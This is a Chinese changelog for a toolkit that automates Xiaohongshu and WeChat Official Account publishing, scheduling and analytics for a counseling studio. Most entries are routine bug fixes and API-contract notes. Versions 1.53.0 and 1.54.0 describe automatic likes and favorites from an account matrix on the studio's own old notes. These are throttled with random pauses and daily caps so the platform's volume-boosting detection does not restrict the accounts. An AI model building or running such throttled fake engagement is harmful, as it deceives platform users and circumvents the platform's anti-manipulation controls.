list 读，`null` 会被当成失败——那样"只改标题"的任务会被判成部分失败。判定重写成按 true 计数。

**新增 `outcome=aborted`**：服务端 `aborted_before_submit: true` 表示文本/图片某步失败导致
**整单没提交、笔记原样**。这是这条产品线上**唯一可以直接重试**的失败——落成普通 failed 会让
agent 白跑一趟人工核对，落成 unknown 又会拦住本该直接重来的重试，所以单列一个 outcome。

**两条会误导人的语义**：

- **活动只能在发布时挂**：编辑页的「关联活动」区 **2026-08-03 起被平台收走**（08-01 还能用）。
  按时间线写而不是写成"不支持"——**平台若恢复我们零改动自动可用**，隔几天拿一篇试
  `applied.activity` 变 true 就是回来了。v1.52.0 写的"别反复切换活动、话题会累积"已随之改掉。
- **定时任务的 pending 是正常等待**（`pending_reason=waiting_schedule`），不是卡死也不是超时；
  只有 `pending_overdue: true` 才该报障。`job_brief` 现在把 pending 四字段抬进信封并给出准确
  说法，轮询超时那句"仍在发布中"改成不覆盖它——**说成超时会诱导 agent 去"救"，那会杀掉定时发布**。

**发布结果现在回显 `applied`**：`topics_requested/applied/failed` 与 components 逐项，
参数被平台静默丢弃当场可见；话题 `reason=no_exact_match` = 平台话题库没这个词，换词能解。

**新增 `publish_note.py --manifest`**：拉服务端机器可读契约。SKILL.md 里注明——**说法对不上时
以它为实时真源**，skill 文档是给人看的快照。实测返回 v0.17.0 契约正常。

测试 890 → 921。

---

## [1.55.3] — 2026-08-03

生产验收现场发现的两处缺陷：`--list` 每行的队列 id 念不出来、`--cancel` 撞 404 时甩原始
HTTP 码。顺带清掉运营可见文案里的内部任务编号。

### 修复：`--list` 每行的 `job_id` 恒为 null，而 `--cancel` 要的正是这个数字

提交回执里服务端回的字段叫 `job_id`，队列查询（`GET /schedule`）每行回的却叫 `id`——两处
不同名。脚本里的两认逻辑（`job_id` 优先、退回 `id`）只挂在提交路径上，`--list` 这条路
直接读了 `id`，于是每行的 `job_id` 恒为 null。

运营念到的字段名和他下一步要敲的 `--cancel <job_id>` 对不上，只能自己猜该敲哪个数——
而猜错的典型后果是「撤不掉，那我再提一条」，原来那条还在，到点发两次。

现在 `job_view()` 与提交路径共用同一个 `job_id_of()`，两种字段名都认。

### 修复：`--cancel` 撞「压根没这条」时甩原始 HTTP 404

服务端把两种撤不掉分得很清楚：404 = 队列里没这条（id 抄错），409 = 有但已不是 pending
（可能已经执行了）。脚本只把 409 翻成了人话，404 直接把 `HTTP 404: ...` 抛给运营，这个
区分就白丢了——而两者的下一步动作完全相反。现在 404 明说「多半是 id 抄错，先 `--list`
对一眼」，并钉住那句「别因为撤不掉就重提一条，到点会发两次」。

### 改进：`run_at_label` 拿服务端的 `run_at_cn` 兜底

服务端每行还给了换算好的北京时间串 `run_at_cn`，`run_at` 缺失时用它兜底。**不直接拿它当
label**：它没有星期，而「周几」正是核对 run_at 有没有写错一天的抓手。

### 改进：运营可见文案不再出现内部任务编号

`stats_ops.py` 的送达率免责与单篇查空提示里写着内部任务编号「T15」，运营读不懂。改成
「拿真数据核准前」「待真数据核准」。

### 测试

新增 4 条：`--list` 每行补 `job_id`、服务端改叫 `job_id` 时也认、只有 `run_at_cn` 时星期
照样念得出、404 说是抄错而不是甩 HTTP 码。队列 fixture 形状改为照抄生产实测的原始返回。
另补 `install.ps1` 的清单接线断言（此前只断言了 `install.sh`，Windows 侧漏装查不出来）。

---

## [1.55.2] — 2026-08-03

服务号 skill final review 收尾：队列第六态 `unconfirmed` 补齐人话，端点速查表按服务端实际契约
校正三处教错、补三处缺失。纯文档与词表，不动任何调用逻辑。

### 修复：定时队列的 `unconfirmed` 状态没人话，会被读成「失败了，重排一条」

定时群发到点撞 45028（群发保护待管理员手机确认），服务端落的是第六态 `unconfirmed`，而
`schedule_ops.py` 的状态词表只收了五态，这条会掉进兜底话术「未收录的状态「unconfirmed」」。
运营读不出「配额已经计了」，最自然的下一步就是照失败重排一条——**而管理员一确认就是真发出：
两次推送 + 烧掉两次月配额，两样都不可逆。**

- `JOB_STATUS_LABELS` 补 `unconfirmed`，话直接说到底：「待管理员确认（45028 群发保护，配额已计，
  绝不重排——重排=推送两次+烧两次配额）」。
- `--status` 的 help 从五态改六态，免得运营以为这个状态筛不出来。

### 修复：端点速查表三处与服务端实际契约不符

速查表是 skill 运行时照着调的那张表，写错一格就是照着错的调。这三处都由 final review 实查
服务端代码核对：

- **`stats` 的参数名不是 `type` 而是 `stat_type`**，且**必填**、必须落在六词表内否则 400。
  六个词与落库粒度一并写明（`getarticleread` / `getarticleshare` / `getarticletotaldetail`
  按篇挂 `msgid`，其余三个是账号级）。原先照 `?type` 调是**每次必 400**。
- **透传白名单里没有 `/cgi-bin/material/get_material`**——服务端刻意剔除的：图片/语音素材回
  裸二进制，强制 JSON 解析会误报「解析微信响应失败」，把好素材说成坏了。素材查询用
  `batchget_material`（它带 url）。
- **`publish` 只收 `media_id`**，没有 `title`。标题跟着草稿走，发布时改不了。

### 补充：速查表缺的三件事

- `GET /ledger/:id` 台账单行直查。「刚提交那条现在怎么样了」是最高频的一问，行数一多列表就翻
  不到。id 非整数回 400、查无此行回 **404 且响应体是 JSON**（服务端刻意自己解析 id，就是为了
  不掉进 axum 的裸文本 rejection）。
- `mass-send` **配额用满回 409**（带 `quota_used` / `quota_total`），且这道闸**排在 confirm 预检
  之前**——配额满时不会先回一句 `success:true` 的假绿预检。
- 错误契约新增一节讲 `unconfirmed` 终态：为什么它既不是 `done` 也不是 `failed`，看到了只做两件事
  （催确认、绝不重排），以及管理员超时未确认时怎么按流水前缀校正配额。

---

## [1.55.1] — 2026-08-02

`stats_ops.py --article` 切到新口径「发表内容」系列（阅读完成率是微信直接给的真字段 +
多篇混算防护），外加服务号 skill 首发后的收尾杂项。

### 修复：`--article` 的字段表用的是旧系列

原先按旧的「图文」系列（`getarticletotal`）解析，而服务端快照存的是新的「发表内容」系列
（`getarticletotaldetail`，2025-11-01 起）——**两套接口字段名完全不同**，拿旧字段表读新数据
会整篇算成空。运营看到的会是「这篇没人看」，而不是「脚本读错了」，正是这条线上最伤的那种错。

- 字段表整体换成新口径：`read_finish_rate`（阅读完成率）是**微信直接给的字段**，不再由脚本
  拿「原文页阅读 ÷ 送达数」硬凑；另收在看/点赞/评论/平均阅读时长/平均跳出位置。
- **费率与均值不求和**：三天的完成率 40%/50%/60% 加起来是 150%，是个看着像指标的垃圾数。
  这类字段改走按阅读人数加权的均值路径，并如实写明这次用的是加权还是简单平均。挡在求和路径外
  之后它们**也没有消失**——`--overview` 里单列 `non_additive`，免得成了「微信给了、脚本吞了、
  谁也不知道」。
- **单篇按 msgid 各归各家**：新口径一条快照里装着当天全部文章（`list[]` 每篇一项，msgid/标题
  挂外层、逐日数在 `detail_list` 里）。不把身份带下来就会「报乙文的数字、挂甲文的标题」。现在
  按 msgid 过滤，混着别篇时出声说一句「已替你滤掉」——闷声滤掉和闷声混算一样不可接受。
- 算不出来的两项（送达→阅读、阅读→点开原文）**置 null 不硬凑**：新口径既不给送达数、也没有
  原文页阅读；送达情况直接看微信给的 `read_delivery_rate`。

### 收尾杂项

- **45028 的固定话术补上配额告知**：群发保护等管理员手机确认时，这一次**已经计入本月 4 次
  配额**——哪怕管理员超时没确认、实际一条都没发出去。原话术只说「超时未确认则本次失败」，
  运营会以为还剩 4 次、白白多排一篇。补的那句是：可请管理员删除对应群发流水校正配额。
  （代码与 SKILL.md / spec 里那两份钉死文案，现在由单测逐字比对，不会再各说各的。）
- **`doctor()` 加报 `wechat_ready`**：服务号用的是**另一把 key**，doctor 不报它，运营只能
  等到真要群发那一刻才发现没配。
- **送达率的免责句搬进公共路径**：它的分母本该是推送数而不是阅读人数，加权只是近似。这句现在
  挂在算出该值的 `weighted_mean` 里，`--overview` 与 `--article` 共用一份，不会一边说了一边漏。
- **不再把结构问题诬成「msgid 写错了」**：快照有行却一条记录都认不出来（payload 空壳、服务端
  换了结构）时，交给「多半是服务端换了字段名」那条警告说；把运营支去反复核对一个没错的 id
  只会白费工夫。
- 补清单接线回归测试（`install.sh` / `plugin.json` 含 `nbdpsy-fuwuhao-operator`）——skill 在
  仓库里 ≠ 装得到；README 的版本号与向导「五个技能」计数追平现状（八个）。

---

## [1.55.0] — 2026-08-02

### 新增第八个 skill：微信服务号运营（`nbdpsy-fuwuhao-operator`）

把长文/分发稿发到公众号这条线补齐了。五个子场景：**排版发文**（`md2wechat.py`：Markdown →
微信白名单内联样式 HTML，图片自动上传换 mmbiz 链接，封面自动进素材库）、**定时发布与定时群发**
（微信 API 没有定时参数，由服务端队列到点执行）、**自定义菜单装修**（本地 JSON 为编辑真源，
apply 前 diff）、**已发布文章查/删**、**数据统计**（涨粉/阅读/分享的每日快照，可跨任意区间）。

凭据模型与小红书那条线不同：**微信 AppSecret 只存生产服务器**、出站走生产固定出口 IP
（微信换 token 认 IP 白名单），运营电脑只拿个人 key `NBDPSY_WECHAT_API_KEY` 走 REST。

两条红线写在 skill 里：**群发每自然月只有 4 次、发出去撤不回**；**微信没有「改」**——已发布
文章改错字只能删了重发，链接会变、阅读量清零。

### 上手向导补上服务号入口（本次融合补的缺口）

新 skill 已接进 `install.sh` / `install.ps1` / `plugin.json` / `marketplace.json` / `README` /
`setup.py` 凭据表，**但 `nbdpsy-guide` 一个字没提**——新运营的第一站漏掉八分之一的能力，
运营问「怎么发公众号」时向导接不住。已补：

- 第 2 步能力表加一行；新增**第 3.7 步 · 发微信服务号**（只做路标 + 三句必须先说清的话：
  凭据是另一把 key、群发高危不可撤回、微信没有「改」）；
- 常见问题速查表加三行（发公众号 / 群发 / 改错字）；第 4 步的「先从哪件开始」清单加第 ⑦ 项；
- 「五个技能」这个过时表述（正文 + frontmatter description 各一处）改成八个。

---

## [1.54.0] — 2026-08-02

### 接 server 当日全量回执：发布现场取证 + 三条口径修正

服务端当日 7 项里 6 项已修、1 项仍未定性，逐条过了一遍。**要改代码的只有一处**（互动失败行的
`detail` 变成 `<原因> | forensics={...}`，全等匹配会失配）——我们这边本来就没有对它的匹配逻辑，
零改动；但把读法写进了输出与文档，因为真正消费它的是 agent。

**新增 `publish_note.py --artifacts <job_id> [--out 目录] [--artifact-name 名]`**：取该次发布留下
的现场截图，按发布流程真实时序排（`12_before_publish` = 点发布前那刻，`16_timeout` = 超时那刻），
`--out` 下载后可直接 Read 看图。**空清单不是异常**——本功能上线前的 job 没打截图标记，
实测 job 135/107 都返回 `count=0` + 说明性 hint，代码按"正常返回"处理，不当故障。

**三条口径跟着改**：

- **跨账号引用技术上已可用**（服务端自动切「他人笔记」按 note_id 检索），但**能传不等于该传**：
  业务规则没变，默认只引用本账号的推介笔记，唯一正当的跨账号引用是主号那篇「接待员联系方式」。
  服务端三种情况会拒绝，**拒绝不阻断发布**，笔记照发只是引用那项没设上。
- **补量已由服务端每 30 分钟自动续跑**——原先"六天要人天天戳"的前提没了，**别排"每天调一次"
  的定时逻辑**，手工命令的用途变成运营带着意图临时发起。
- **`点赞/收藏_not_effective` 绝不要重试**（约 4%，赞与藏成对失败）。点赞是开关：若首次点击其实
  已生效、只是图标没刷新，再点一次就是**取消点赞**。它会在 24 小时冷却后自动重试，**是延后一天
  不是数据丢失**。此现象**仍未定性**——服务端一度说"根因是页面有两个互动栏"后又自己收回
  （修复后仍复现），所以别按已解决对待、也别自行归因重试。`note_not_found` 同理：现在基本只在
  笔记真被删或转私密时出现，先查笔记状态再说。

---

## [1.53.0] — 2026-08-02

### 接 server 08-02 增量：历史笔记互动补量 + 评论判定修正的口径

**新增 `note_ops.py --backfill-interactions --scope account|all|newcomer`**（配 `--account` /
`--actor`）与 `--backfill-status <job_id>`：给**历史笔记**补点赞收藏（不评论——评论仍只在本系统
发布笔记时自动触发）。

**这个命令故意不轮询**。服务端四层限速（每账号每天 20 篇 / 单轮 5 篇 / 两篇之间随机停 60–240 秒 /
不额外起浏览器），全矩阵互补一遍约**六天**——守着轮询只会超时后给出误导性的 unknown。提交完
立即返回 job_id，进度用 `--backfill-status` 查。

**「慢是设计意图」写进了 hint 和 SKILL.md，而不是只写在文档里**：看到跑得慢的第一反应很容易是
调高上限或反复重试，而集中给老笔记互动正是平台眼里最典型的补量特征，撞墙的代价是账号被置
`restricted`、要人工用手机扫码解开，期间该号所有任务全部失败。撞墙时服务端立刻中止本轮但
**已完成部分照常记账不回滚**，别当成白跑了。本操作非幂等，失败不重试。

**评论成功判定的口径跟着服务端放宽**：现在**文案出现在评论列表**即算成功；结果里新增的
`cleared`（输入框是否清空）**只是排查信息，不判成败**。此前两条件做「与」判定，把 7 条实际已
发出去的评论记成 error，**那批历史记录没有回改**——拿历史数据算评论成功率时数值偏低是这个原因，
不是突变。脚本判定本来就只认服务端 status，无需改逻辑，但把这条口径写进了 docstring 与 SKILL.md。

**跟着服务端收回一条旧说法**：此前材料里「两个账号因访问频次被弹验证墙」的归因已被证伪（那两次
都发生在当天第一次会话）。SKILL.md 里据此写的「一小时 5 次会话」具体数字已删，保留仍然成立的
部分——反复起会话确实有代价，别把批量任务拆成大量小请求高频调用。同时加了一条：**不要因为某个
账号撞过一次墙就把它排除在任务范围外**，撞墙不是持久状态，判断可用性只看 `cookie_status`。

另：每日台账同步发现手工发布的笔记时会自动派点赞收藏 + 登记正文抓取与目的分类，所以新发现的
笔记 `note_purpose` 可能暂时是 `null`——**那是"还没算出来"，不是"没有目的"**。

---

## [1.52.1] — 2026-08-02

### 补上 `cookie_status=restricted`：发布链路此前完全不认它

对着 server 侧的端点变更清单逐条回核 v1.52.0，发现 D 段的枚举新增只接了一半——`note_ops.py`
认 `restricted`，**`publish_note.py` 不认**。后果是：

- `resolve_account` 只对 `invalid` 给警示，被挂验证墙的号照发不误，failed 了也不知道为什么；
- `self_check` 里 `restricted` 既不在 `usable` 也不在 `need_relogin`，**从判定里静默消失**——
  运营只看到"可用号少了"，查不出原因，或者被别的分支文案误导去重新扫码（治不好）。

现在：`resolve_account` 单独给 restricted 警示；`self_check` 新增 `restricted` 字段并在
`verdict` 里点名。文案统一强调**这不是登录态失效**——cookie 好好的，重新扫码登录治不好，
得让运营用手机小红书 App 扫码验证身份；提示「请求太频繁」就先晾着。

顺带把四处写死的「五态」全部改成六态（`publish_note.py` docstring、xhs SKILL.md 两处、
guide SKILL.md 验活一节）——同一个枚举散在多处平行文案里，改一处等于没改。

---

## [1.52.0] — 2026-08-02

### 接上 nbdpsy-server 的笔记全量能力：发布之后的那一半

服务端 2026-08-01 交接文档《笔记能力全量对接》落地到 skill 侧。此前 skill 只会「把笔记发出去」，
发出去之后的一切（平台上现存哪些笔记、改合集/引用/活动、切公开或私密、发评论）一概够不着。
没有破坏性变更，既有调用照常工作。

**新增 `nbdpsy-xiaohongshu-creator/scripts/note_ops.py`**：

- 查询：`--ledger`（台账，平台上**现存**哪些笔记）/ `--note <note_id>`（单条，**只有这里给正文**）/
  `--collections` / `--activities [--keyword]`；
- 操作：`--set-components`（合集/引用/活动）/ `--set-visibility --privacy 0|1` / `--comment`；
- 幂等维护：`--sync-ledger` / `--backfill-purpose`（这两个失败可放心重跑）。

**`publish_note.py` 发布时可选带五个字段**：`--collection-id` / `--quoted-note-id` /
`--activity-id` / `--related-counselor` / `--note-purpose`；后两个也可写进笔记 frontmatter，
命令行优先。**只在显式给值时才下发**——不传与传 null 在服务端语义不同，不替用户猜。

**四条硬规矩写进了代码，不只是文档**：

- `permission_code` 的 `null` **不是公开**。统一输出 `visibility: public|private|unknown` 三态，
  `visibility_of()` 只认 `== 0`。服务端就因为把 null 当公开，差点把用户刻意隐藏的私密笔记改回公开；
- **台账 ≠ 发布任务**。笔记被删后 `publish_jobs` 仍是 `published` 不回滚（实证某号 20 条 published、
  平台只剩 17 篇），所以「这个号有几篇笔记」只认 `--ledger`；
- **成功不等于生效**。三组件逐项看 `applied`/`failed`，`failed` 非空一律 `outcome=partial` + exit 1，
  提示只对失败项单独重来（私密笔记加合集会被平台静默丢弃）；
- **非幂等失败不重试**。可见性/评论/三组件提交后再出任何异常都落 `outcome=unknown` + exit 0，
  绝不落 failed 诱导重发。为此把提交与轮询拆成两步（`start_*` / `poll_*`），入队拿到 id 的那一刻
  就记进 `inflight`——轮询期断网也不会把已入队的任务说成「没发生」。可见性还挡掉了布尔值：
  JSON 里传 `true` 服务端 pydantic 会读成 `1`，等于悄悄把笔记藏起来。

**实测端点时抓到一个自己差点犯的错**：单条端点响应是 `{"note": {...}}` 包一层，直接读顶层
`permission_code` 恒 `None`，正好落进「null 当未知」那条规则，把一篇公开笔记显示成 unknown。
已修 + 回归测试钉死两种形态。

业务规则也写进了 SKILL.md 与脚本 docstring：**只引用本账号的推介笔记**（跨账号引用会把客户导到
别的运营名下、抢同事 KPI）、**矩阵号评论零引流指向**、评论区不能放链接；风控上「能走创作中心就
别走他人主页」「别为了确认反复起会话，一小时 5 次会被打成请求太频繁」。

测试 689 → 716（新增 27 条 note_ops + 5 条发布字段），全绿。

---

## [1.51.0] — 2026-07-29

### 即梦登录重写：脚本自己把登录页开到用户面前

老板定案：用户都在有显示屏的个人电脑上用，登录就该由脚本直接把网页开出来让人扫码。

**先取证再动手**（隔离 HOME 跑真 CLI + PATH 前置假 opener，全程没碰生产登录态），
结果推翻了上一版的三个前提：

- **即梦 CLI 根本没有 OAuth 设备流**。整个二进制 `strings` 全扫，`verification_uri` /
  `user_code` 出现 **0 次**。上一版据此解析 CLI 输出、号称"脚本自己开浏览器"——那段代码
  **从未触发过**，一直是 CLI 自己在开。
- **真实是本地回调流**：起 `127.0.0.1:<回调端口>` 服务器 → opener 打开
  `https://jimeng.jianying.com/ai-tool/login?callback=…&from=cli&random_secret_key=…`，
  CLI 终端**不打印这个网址**。
- **给这个网址生成二维码是死路**：callback 指向 `127.0.0.1`，手机扫走等于在手机上登录，
  回调回不到电脑。要扫的是**即梦页面自己渲染的那张**。上一版"备用二维码图片"是个假出口。

于是重写成两条互为备份的取网址路径：

- **opener shim（POSIX）**：把假的 `xdg-open`/`open` 等五个 opener 放进 PATH 最前，
  CLI 一调就把网址落进捕获文件；shim **只记录不转发** → 浏览器由脚本自己开，全程恰好一次。
- **磁盘重建（全平台兜底）**：日志 `[RunLogin] start login flow … port=` 取端口 +
  `credential.json` 的 `random_secret_key` → 拼回同一个网址。Windows 拦不住系统 opener，
  走这条；此时 CLI 已自己开好浏览器，脚本只补网址文本、**不重复弹窗**。

两条路都做了端到端实测（各起一次真 CLI 登录流），拼出的网址与拦截到的**字节级一致**。

### 删掉 `--headless`

那是"无头 Chrome 载入登录页 + 终端画字符二维码"，要装 google-chrome，字符画在 Windows
终端显示不全——正是运营反复登录失败的事故根因。用户都有显示屏，整条路连同 `--mode`
`select_mode` `parse_device_flow` `make_qr` `_chrome_missing` 一并删除，`qrcode` 依赖
（含运行时 pip 自动安装）也随之去掉。

### 端到端实测才抓到的一个 bug

日志时间戳只精确到秒，而「本次启动时刻」带微秒，直接比大小会把**与启动同一秒写下的本次端口**
误判成上一次的旧行整条丢掉 → 兜底路静默拿不到网址。已修（`since` 先截到整秒）并补回归测试。
单元测试用自造时间戳，看不见这一类；这条只有真跑才会露出来。

---

## [1.50.0] — 2026-07-29

### 切到 server 原生 profile_set，下线 profiles-v1 容器方案

server v0.17.0 已原生支持多套风格档案（回执 `NBDpsy/文档/2026-07-28-server回执-profile-set上线.md`）。
上一版为绕开"一人一份档案"而塞进 `profile` JSON 的容器整个下线，改调原生端点。
**运营的命令行一个字没变**，换的全是底层。

⚠️ **必须升级**：server 有 B5 哨兵——旧客户端再把 `profiles-v1` 容器 PUT 上来会
**400「工具包版本过旧，请升级后重试」**。低于本版的运营改风格时会撞到，跑一次
`python3 COMMON update` 即可。guide 里已加显眼提醒 + 速查表条目。

**删掉**：十个容器操作函数（`is_multi`/`to_multi`/`select_set`/…）、`--put` 与 `--admin-default`
的两道守卫及其多出来的 GET、`profile_warnings`/`warn_dropped_keys` 的容器分流。
`dropped_keys` 语义自动回正（PUT 的是单套内容，套内部字段丢失现在能正确算出）。

**新增 `--init-sets`**：server 不给新运营预建套（回执 §2 交给客户端），
按默认配置的套数在自己名下建齐。

**实测纠正了三处猜测**（Owner A 在 nbdpsy-server 源码仓跑真实 FastAPI + 隔离 sqlite 取证，零生产写入）：

- `POST /sets` **不要 `base_version`**——建套/改名/删套/切默认四个动作**都没有乐观锁**。
  四条命令不再强制它；传了则接受+忽略+提示一句（老文档还在传）。
- **`from` 跨不了 scope**：以自己的 scope 建套时 `from` 只在自己的套里找，
  复制默认配置的套会 404。`--init-sets` 改走 `GET /sets?scope=admin-default` →
  `GET /admin-default?set=名` → `POST /sets {name,kind,profile}`。
- **`GET /api/style-profile?set=名&scope=admin-default` 不通**：该端点没有 `scope` 参数。
- 附带坑：**零套运营 `GET ?set=文字版` 不 404**，返 200 + `exists:false` + `set:"图文"`（忽略 set 的回落）。
  照单全收就会把图文的内容当文字版喂给创作端。`--get --profile` 已加判据。

**验证抓到的静默错套（本轮最要紧的修复）**

`--profile` 原本只放行给了读命令（`--get` / `--version N`），而 `--put` / `--versions` /
`--rollback` / `--admin-default` 这四个 server 都支持 `?set=` 的端点没放行、也不拼 `?set=`——
**运营以为在改文字版，实际改的是默认那套**，响应 200、照报「✓ 已整份覆盖」。
`--admin-default` 那条更是全公司级：老大想把自己的文字版推成默认配置，会写进默认配置的图文套。

已统一修：四个动作放行 `--profile`/`--kind`、共用同一份挑套逻辑、请求拼 `?set=`；
**写完再核一次服务端回的 `set` 与点名的是否一致**，不一致直接报错而不是打勾；
成功那行也带上套名（原来只报版本号，看不出写了谁）。

新增/重写测试：`test_style_profile_multi.py` 整体重写（78 条容器用例 → 73 条端点用例），
全量 **681 passed**。

## [1.49.0] — 2026-07-28

### 文字版页脚改成品牌名

老板：图片右下角不该是小红书号，应该是「NBDpsy心理咨询工作室」。

- 页脚固定渲染 `NBDpsy心理咨询工作室`，**不再需要配置**。
- 连带删掉整条 `xhs_id` 链路：`--xhs-id` 参数、frontmatter `xhs_id`、
  `split_longform.py` 往系列篇 frontmatter 里写的那行，以及 spec / 审查清单里
  「页脚小红书号是不是这个账号的」那两条判据（改成「核一眼在位即可」）。
  存量 `body.md` 里残留的 `xhs_id:` 会被当未知键忽略，不影响出图。

## [1.48.1] — 2026-07-28

### 修 v1.48.0 批量改名带出的重复词

「排版长图 / 文字长图 / 长图笔记」三个词都被替成了「文字版」，于是触发词列表里出现
「文字版 / 文字版 / 文字版笔记」这种重复项（xhs 与 guide 各一处）；
另有一处「把正文精细排版成竖版文字版」读起来绕，改成「排版成一组竖版图片、整篇发（文字版）」。
测试数据里改名用例的目标名「文字版版」换成「水墨文字版」。

## [1.48.0] — 2026-07-28

### 风格档案多套化 + 拆长文先问形态 + 术语改名「长图」→「文字版」+ 画布改 9:16

老板四条：拆长文时**先问是图文还是文字版**；风格档案支持**多套、自定义命名**；
初始默认「图文」「文字版」两套；参考图拆解的结果**可以存成新的一套**。
另纠正两处：「长图」用词不准（**一张图装完整篇才叫长图**，我们是多张图承载一篇 = **文字版**）；
文字版是**全屏阅读、自己渲染的，不必遵循路线① 那个 gpt-image 的 2:3**。

**多套风格档案**（server 零改动——实测确认它对 `profile` 原样存取、不校验结构）

- 结构 `{schema:"profiles-v1", active, profiles:{名:{kind,...}}}`，`kind` ∈ `carousel`(图文) / `typeset`(文字版)。
- 新增 `--list-profiles` / `--get --profile 名` / `--get --kind k` / `--new-profile`（可 `--from` 复制、
  `--file` 吃参考图拆解产物）/ `--set-active` / `--rename-profile` / `--delete-profile`（删到只剩一套拒）。
- **向后兼容**：没有 `schema` 键 = 老平铺格式，读成一套「图文」，**不自动写回**。
- `typeset_longimage.py --style <json>` 吃「文字版」那套，用它覆盖主题默认值
  （`bg`/`accent`/`font`/`title_font`/`indent`/`texture`，`null` 不覆盖）。

**拆长文先问形态**：运营没点明就**开口问**，判据只用来给建议——路线① 出 5–8 条、
路线② 出 1 条，产出差一个数量级，不该静默替他决定。

**画布 1440×2400（3:5）→ 1080×1920（9:16 手机全屏）**

顺带发现：换成 9:16 后**正文反而更好读**——原来 1440 宽配 46px 一行 27 字偏挤，
现在 1080 宽同样字号一行约 20 字，正好是舒适区。所以字号基本没缩，缩的是版心留白。
实测 **≈240 字/页**（1726 字→8 页，3346 字→13 页；原 3:5 是 ≈370 字/页）。
feed 安全区不用重算——3:5 与 9:16 按 3:4 裁掉的都是上下各 240px。

**术语改名**：「文本排版长图 / 排版长图 / 文字长图 / 长图」→ **文字版**（121 处、12 个文件）。
脚本名 `typeset_longimage.py` 与 `longform-typeset-spec.md` 不改（技术标识符保持英文）。

**两轮对抗验证（13 agents）抓出并修掉的真缺陷**

- 🔴 **`--put` 会静默抹掉运营其余几套**：多套时裸 `--get` 只给 active 那套的**内容**，
  而 `--put` 覆盖的是**整份档案**——按 guide 逐字教的「GET→改→PUT」走一遍，
  其余套永久消失、命令还 exit 0 报成功。而 `dropped_keys` 给的补救话术
  「先 `--get` 拿全量再重发」**恰恰就是产生这份坏 body 的命令**（死循环）。
  已加发 PUT 前的守卫（拒绝、一个 PUT 都不发）+ 补救话术改口。
- 🔴 **`--admin-default` 同款漏洞且更严重**：默认配置**不进版本历史、rollback 救不回来**，
  被单套 body 打平后全体跟随者当场少掉几套。已加同款守卫。
- 🔴 **`--style` 从没接进出图链路**：全仓 `.md` 里命中 0 次，运营的「文字版」那套档案读了等于没读；
  而且文档里的命令写死 `--theme clean`，优先级高于档案，会把档案主题盖掉。已三处补齐 + 删掉写死。
- 🔴 **审查端两份 checklist 没有 owner**（分工缺口）：`--version N` 返回的是整份容器，
  `profile.visual.*` 恒 undefined → 取值扑空 → 回落默认口径 → **把自带调性的运营整批判成假 FAIL**。
  已放开 `--version N --profile <套名>` + 两份清单补取值路径表。
- **信封剥壳只认 `--get`**：`--get-default` / `--version` 的输出连壳发上去，
  `version`/`source` 会被当档案存进去。已扩成认全三种信封——顺带让 guide 不必再教运营手工剥层。
- guide 三处纠正：`exists:false` 跑 `--version 0` 必然 404（改用 `--get-default`）；
  `--list-profiles` 对 `exists:false` 列的是**他跟随的默认配置**有几套（原文说"同样只列出一条"是错的）；
  多套的运营老大用 `--get` 更新默认配置会把它打平。

新增 78 个单测，全量 **686 passed**。

## [1.47.0] — 2026-07-28

### 补上路线② 的运营入口（老板问「运营该怎么触发」时查出来的缺口）

路线② 的能力做完了，但**运营找不到它**——查证发现三处断链：

- **`nbdpsy-guide` 完全没提路线②**。guide 是运营的第一站（「教我用 / 这个能干啥」），
  第 2 步那张「能干啥」表里只有「把这篇拆成小红书」，运营根本不知道还有长图这条路。
  已补：能力表加一行、常见问题速查加 4 行（做成排版长图 / 拆成上中下 / 末页带上某咨询师 /
  这篇适合哪种），frontmatter 触发词补「拆成小红书还是做长图 / 整篇发别拆 / 拆成上中下」。
- **`nbdpsy-content-pipeline` 没有路线选择**，「做一期 XX 的全套内容」会永远走路线①。
  已在第 4 步写明：默认①；走②只在「运营开跑前就说了」或「拆分时发现价值在完整论证链上
  → **停下来问运营**」两种情况；并说明走②后第 6 步的停等闸门不适用（不过 AI 生图）。
- **系列篇的触发词没进 skill description**：运营说「拆成上中下」可能压根触发不到 skill。
  已补「拆成上中下 / 分成一二三四 / 做成系列 / 这篇太长拆几篇 / 整篇发别拆」。

**另一处口径修正**：第 0.6 步原本写「长文价值在完整论证链上 → 路线②」是**直接判定**——
但路线① 出 5–8 条、路线② 出 1 条，产出差一个数量级，不该静默替运营换形态。
已改成「**建议**」：命中时停下来问一句，说清「为什么适合长图 / 产出会变成几条 /
长图不过 AI 更快更省额度」再让他拍板；他说随便就走默认的路线①。

## [1.46.0] — 2026-07-28

### 末页推介改成「针对性推介」+ 封面标题按实拍范本放大

老板三条追加要求：「末页推介卡标题改成咨询师介绍里的那种标题，谁，做什么，解决什么问题」
「这就算一个针对性的推介了，需要结合文本内容来写推介标题与内容」「需要说明为啥这个咨询师能陪
来访解决这类问题，他怎么擅长了」；另给了一张小红书实拍范本，指出「标题应该更大更醒目、
空间更大，这不仅是首页，也是小红书展示的封面」。

**推介卡：从名片改成桥**

- 卡片主标题改走**三要素**（`心理咨询师-{姓名}，{陪你+能力动词短语（嵌困扰词）}`），
  与 `counselor-note-spec.md` §1 的发布标题同一套口径，不另造。
- 新增 `--counselor-headline`；`--counselor-blurb` 语义改为**针对性**推介文案。
  两者不传都会 warning 明说"这是通用兜底，没按针对性推介做"。
- `references/longform-typeset-spec.md` §8 重写（7 个小节）+ §9 验收清单扩到 16 条：
  定位是「本文的问题 × 这位咨询师的对口能力」，通用介绍 = 返工；
  素材字段表（methods/philosophy/experience/training/testimonials/unsupported 各写什么）；
  逐句出处核对表**双向**（咨询师断言→字段、本文断言→行号）且必须落盘。

**封面标题**（首页 = feed 封面）

- 字号 76→104px（范本实测标题≈正文 1.9 倍），副信息行移到标题**上方**，下方留白 116px。
- **修掉一个真问题**：小红书 feed 按 3:4 裁这张 3:5 的图，上下各切掉 240px，
  原来标题顶部正好被削掉。新增 `COVER_SAFE_TOP`，首页整体压进安全区。

**对抗验证（6 agents，四路全 FAIL）抓出并修掉的真缺陷**

- 🔴 **推介文案完全绕过违禁词扫描**：`check_compliance.py` 只接受**文件路径**，
  而 headline/blurb 只以命令行字符串传入、从不落盘——全套图里商业风险最高的一段
  （它带 CTA）从来没被扫过。现在出图前自动落 `promo-draft.md` 并跑扫描，不过不出图。
- 🔴 **危机声明与商业 CTA 同页，违反 G6**：推介卡上有品牌行与「目前接受预约」，
  却把 12356 渲染在同一页。已从卡片移除——它的位置在发布正文（§5）。
- 🔴 **`is_accepting` 判据缺失**：停单的咨询师引来了约不上。新增硬闸门，false 直接报错。
- 🔴 **"找不到硬对应"的出口是死链**：原文交叉引用指向 unsupported 那条，
